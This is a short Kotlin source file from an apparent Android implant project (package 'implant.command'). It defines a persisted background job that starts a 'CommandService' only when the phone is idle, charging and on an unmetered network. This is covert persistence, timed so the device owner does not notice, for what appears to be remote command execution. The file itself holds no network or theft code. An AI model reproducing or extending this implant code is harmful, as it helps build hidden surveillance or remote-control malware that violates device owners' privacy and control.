package com.cooperthecoder.implant.command

import com.evernote.android.job.Job
import com.evernote.android.job.JobRequest


class StartCommandServiceJob: Job() {

    companion object {
        val JOB_NAME: String = StartCommandServiceJob::class.java.name

        fun schedule() {
            // Do this plugged in on an unmetered network when the device is idle.
            JobRequest.Builder(JOB_NAME)
                    .setRequiredNetworkType(JobRequest.NetworkType.UNMETERED)
                    .setRequiresDeviceIdle(true)
                    .setRequiresCharging(true)
                    .setRequirementsEnforced(true)
                    .setPersisted(true)
                    .build()
                    .schedule()
        }
    }

    override fun onRunJob(params: Params): Result {
        val intent = CommandService.intent(context)
        context.startService(intent)
        return Result.SUCCESS
    }
}